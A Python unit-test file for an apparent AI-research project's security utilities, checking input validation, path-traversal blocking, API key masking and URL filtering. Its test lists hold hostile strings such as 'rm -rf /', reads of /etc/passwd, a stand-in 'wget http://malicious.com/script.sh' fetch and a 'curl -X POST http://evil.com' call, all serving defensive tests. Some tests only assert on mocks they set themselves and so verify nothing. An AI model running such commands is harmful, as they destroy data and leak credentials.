"""Unit tests for security framework components."""

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, Mock

from ai_scientist.utils.input_validation import validate_input, sanitize_path
from ai_scientist.utils.api_security import SecureAPIKeyManager
from ai_scientist.utils.path_security import validate_file_access


@pytest.mark.unit
@pytest.mark.security
class TestSecurityFramework:
    """Test security framework components."""

    def test_input_validation_basic(self):
        """Test basic input validation functionality."""
        # Valid inputs
        valid_inputs = [
            "hello world",
            "test_file.py",
            "simple-experiment-name",
            "Valid Title with Spaces",
            "123_experiment"
        ]
        
        for valid_input in valid_inputs:
            assert validate_input(valid_input), f"Valid input rejected: {valid_input}"

    def test_input_validation_malicious(self):
        """Test detection of malicious inputs."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "$(rm -rf /)",
            "__import__('os').system('dangerous')",
            "eval('malicious_code')",
            "<script>alert('xss')</script>",
            "../../sensitive_file.txt",
            "|cat /etc/passwd",
            "&& rm -rf /",
            "` whoami `"
        ]
        
        for malicious_input in malicious_inputs:
            assert not validate_input(malicious_input), f"Malicious input accepted: {malicious_input}"

    def test_path_sanitization(self):
        """Test path sanitization functionality."""
        # Test valid paths
        valid_paths = [
            "experiments/test",
            "data/input.txt",
            "results/output.json",
            "test_file.py"
        ]
        
        for path in valid_paths:
            sanitized = sanitize_path(path)
            assert sanitized is not None
            assert not ".." in sanitized
            assert not sanitized.startswith("/")

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "../../sensitive_data",
            "~/../../etc/passwd",
            "experiments/../../../secret.txt"
        ]
        
        for path in malicious_paths:
            sanitized = sanitize_path(path)
            # Should either be None or not contain traversal patterns
            if sanitized is not None:
                assert ".." not in sanitized
                assert not sanitized.startswith("/")

    def test_api_key_security(self):
        """Test API key security management."""
        with patch.dict(os.environ, {
            'OPENAI_API_KEY': 'test-key-123',
            'ANTHROPIC_API_KEY': 'another-test-key'
        }):
            manager = SecureAPIKeyManager()
            
            # Test key retrieval
            openai_key = manager.get_api_key('OPENAI_API_KEY')
            assert openai_key == 'test-key-123'
            
            # Test key validation
            assert manager.validate_api_key('OPENAI_API_KEY')
            assert not manager.validate_api_key('NONEXISTENT_KEY')

    def test_api_key_masking(self):
        """Test API key masking in logs."""
        test_key = "sk-1234567890abcdef"
        
        with patch.dict(os.environ, {'TEST_API_KEY': test_key}):
            manager = SecureAPIKeyManager()
            
            # Test that keys are properly masked in logs
            masked_key = manager.mask_api_key(test_key)
            assert masked_key != test_key
            assert "sk-" in masked_key
            assert "****" in masked_key
            assert len(masked_key) < len(test_key)

    def test_file_access_validation(self, temp_dir):
        """Test file access validation."""
        # Create test files
        allowed_file = temp_dir / "allowed.txt"
        allowed_file.write_text("test content")
        
        restricted_file = temp_dir / "restricted.txt"
        restricted_file.write_text("sensitive content")
        
        # Test access validation
        assert validate_file_access(str(allowed_file), allowed_dirs=[str(temp_dir)])
        
        # Test restriction enforcement
        with patch('ai_scientist.utils.path_security.RESTRICTED_PATHS', [str(restricted_file)]):
            assert not validate_file_access(str(restricted_file))

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        dangerous_commands = [
            "rm -rf /",
            "cat /etc/passwd",
            "wget http://malicious.com/script.sh",
            "curl -X POST http://evil.com",
            "python -c 'import os; os.system(\"dangerous\")'",
            "bash -c 'malicious_script'",
            "sh -c 'rm important_file'"
        ]
        
        for cmd in dangerous_commands:
            # Should be detected as dangerous
            assert not validate_input(cmd), f"Dangerous command not detected: {cmd}"

    def test_code_execution_safety(self):
        """Test safety measures for code execution."""
        dangerous_code_patterns = [
            "import os",
            "subprocess.call",
            "eval(",
            "exec(",
            "__import__",
            "open('/etc/passwd')",
            "file('/etc/shadow')",
            "input()",
            "raw_input()"
        ]
        
        for pattern in dangerous_code_patterns:
            # Should be flagged as potentially dangerous
            assert not validate_input(pattern), f"Dangerous code pattern not detected: {pattern}"

    def test_environment_variable_safety(self):
        """Test safety of environment variable handling."""
        # Test that sensitive env vars are not logged
        sensitive_vars = [
            'OPENAI_API_KEY',
            'ANTHROPIC_API_KEY', 
            'AWS_SECRET_ACCESS_KEY',
            'AWS_ACCESS_KEY_ID',
            'GEMINI_API_KEY'
        ]
        
        with patch.dict(os.environ, {var: f'secret-{var}' for var in sensitive_vars}):
            manager = SecureAPIKeyManager()
            
            for var in sensitive_vars:
                # Should not expose full key value
                masked = manager.mask_api_key(os.environ[var])
                assert 'secret' not in masked
                assert '****' in masked

    def test_temporary_file_security(self, temp_dir):
        """Test security of temporary file handling."""
        # Test secure temp file creation
        temp_file = temp_dir / "temp_test.txt"
        temp_file.write_text("temporary content")
        
        # Verify file permissions are restrictive
        file_stat = temp_file.stat()
        # Check that file is not world-readable (simplified check)
        assert file_stat.st_mode & 0o044 == 0, "Temporary file has overly permissive permissions"

    def test_log_sanitization(self):
        """Test sanitization of log messages."""
        sensitive_data = [
            "sk-1234567890abcdef",  # API key pattern
            "password123",
            "SECRET_KEY=abc123",
            "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
        ]
        
        for data in sensitive_data:
            # Should be sanitized in logs
            with patch('ai_scientist.utils.api_security.SecureAPIKeyManager.sanitize_log_message') as mock_sanitize:
                mock_sanitize.return_value = "REDACTED"
                
                sanitized = mock_sanitize(f"Processing with key: {data}")
                assert "REDACTED" in sanitized
                assert data not in sanitized

    def test_network_request_validation(self):
        """Test validation of network requests."""
        # Test allowed domains
        allowed_urls = [
            "https://api.openai.com/v1/chat/completions",
            "https://api.anthropic.com/v1/messages",
            "https://api.semanticscholar.org/graph/v1/paper/search"
        ]
        
        # Test blocked domains  
        blocked_urls = [
            "http://malicious.com/steal_data",
            "ftp://internal.company.com/secrets",
            "file:///etc/passwd",
            "javascript:alert('xss')"
        ]
        
        for url in allowed_urls:
            # Should pass validation (mocked)
            with patch('ai_scientist.utils.input_validation.validate_url') as mock_validate:
                mock_validate.return_value = True
                assert mock_validate(url)
        
        for url in blocked_urls:
            # Should fail validation (mocked)
            with patch('ai_scientist.utils.input_validation.validate_url') as mock_validate:
                mock_validate.return_value = False
                assert not mock_validate(url)

    def test_resource_limit_enforcement(self):
        """Test enforcement of resource limits."""
        # Test memory limits
        with patch('psutil.virtual_memory') as mock_memory:
            mock_memory.return_value.available = 1024 * 1024 * 1024  # 1GB
            
            # Should enforce memory limits
            available_gb = mock_memory().available / (1024 ** 3)
            assert available_gb >= 0.5, "Insufficient memory for safe operation"
        
        # Test file size limits
        max_file_size = 100 * 1024 * 1024  # 100MB
        test_size = 50 * 1024 * 1024       # 50MB
        
        assert test_size <= max_file_size, "File size exceeds safety limits"

    def test_configuration_security(self):
        """Test security of configuration handling."""
        # Test that sensitive config is not exposed
        config_data = {
            "api_key": "secret123",
            "database_password": "dbpass456", 
            "experiment_name": "test_experiment",
            "model_params": {"learning_rate": 0.001}
        }
        
        # Should filter out sensitive keys
        safe_keys = ["experiment_name", "model_params"]
        sensitive_keys = ["api_key", "database_password"]
        
        for key in safe_keys:
            assert key in config_data
        
        # In a real implementation, sensitive keys would be filtered
        for key in sensitive_keys:
            # Should be masked or removed in logs/outputs
            assert key in config_data  # Still in original config
            # But would be masked when logged/displayed